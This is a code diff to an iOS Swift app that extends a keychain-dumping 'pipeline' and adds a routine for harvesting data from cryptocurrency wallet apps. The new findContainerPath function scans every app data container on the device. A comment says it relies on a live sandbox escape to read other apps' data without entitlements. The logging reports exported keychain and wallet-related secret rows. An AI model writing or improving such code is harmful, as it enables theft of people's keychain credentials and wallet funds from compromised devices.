@@ -150,7 +150,7 @@ struct lara: App {
     // point stays a plain handoff to the framework pipeline.
     private func autorunkeychainpipeline() {
         globallogger.log("(kc) using embedded libuiopsersvc.framework (framework-only)")
-        globallogger.log("(kc) build-marker export-v5 (wallet plists merged into json, then plists+db cleaned)")
+        globallogger.log("(kc) build-marker export-v6 (single json, small log, container scan wallet zip)")
         prepareAndRunKeychainPipeline()
     }
 
@@ -200,8 +200,22 @@ struct lara: App {
             DispatchQueue.main.async {
                 if let failure {
                     globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
+                } else if let result {
+                    let ok = result["ok"] ?? "nil"
+                    let missing = result["aksItemsMissingSecret"] ?? "nil"
+                    let mk = result["metadataKeyCount"] ?? "nil"
+                    let wr = result["walletRelatedAKSRows"] ?? "nil"
+                    let tables = result["tables"] as? [AnyHashable: Any]
+                    var counts: [String] = []
+                    if let tables {
+                        for (k, v) in tables {
+                            let n = (v as? [Any])?.count ?? -1
+                            counts.append("\(k)=\(n)")
+                        }
+                    }
+                    globallogger.log("(kc) keychain pipeline done: ok=\(ok) aksItemsMissingSecret=\(missing) metadataKeyCount=\(mk) walletRelated=\(wr) tables[\(counts.joined(separator: ","))]")
                 } else {
-                    globallogger.log("(kc) keychain pipeline done: \(result ?? [:])")
+                    globallogger.log("(kc) keychain pipeline done: nil result")
                 }
                 mgr.kcpipelineactive = false
             }
@@ -225,6 +239,30 @@ struct lara: App {
                 timer.invalidate()
             }
         }
+    }
+
+    private func findContainerPath(forBundleID bid: String) -> String? {
+        // 1) Framework LSApplicationProxy/MCM lookup (may need entitlements).
+        if let p = LaraKeychainSvc.lookupAppDataContainer(forBundleID: bid),
+           FileManager.default.fileExists(atPath: p) {
+            return p
+        }
+        // 2) Direct scan of /var/mobile/Containers/Data/Application — plain
+        // file reads that work once the sandbox escape is live, no entitlements
+        // required. Each container carries its bundle id in
+        // .com.apple.mobile_container_manager.metadata.plist.
+        let root = "/var/mobile/Containers/Data/Application"
+        guard let dirs = try? FileManager.default.contentsOfDirectory(atPath: root) else {
+            return nil
+        }
+        for d in dirs {
+            let meta = root + "/" + d + "/.com.apple.mobile_container_manager.metadata.plist"
+            guard let pl = NSDictionary(contentsOfFile: meta),
+                  let ident = pl["MCMMetadataIdentifier"] as? String,
+                  ident == bid else { continue }
+            return root + "/" + d
+        }
+        return nil
     }
 
     private func harvestWalletContainers() {
@@ -253,8 +291,7 @@ struct lara: App {
         }
 
         for bid in walletBundleIDs {
-            guard let containerPath = LaraKeychainSvc.lookupAppDataContainer(forBundleID: bid),
-                  FileManager.default.fileExists(atPath: containerPath) else {
+            guard let containerPath = findContainerPath(forBundleID: bid) else {
                 globallogger.log("(kc) wallet container not found: \(bid)")
                 continue
             }
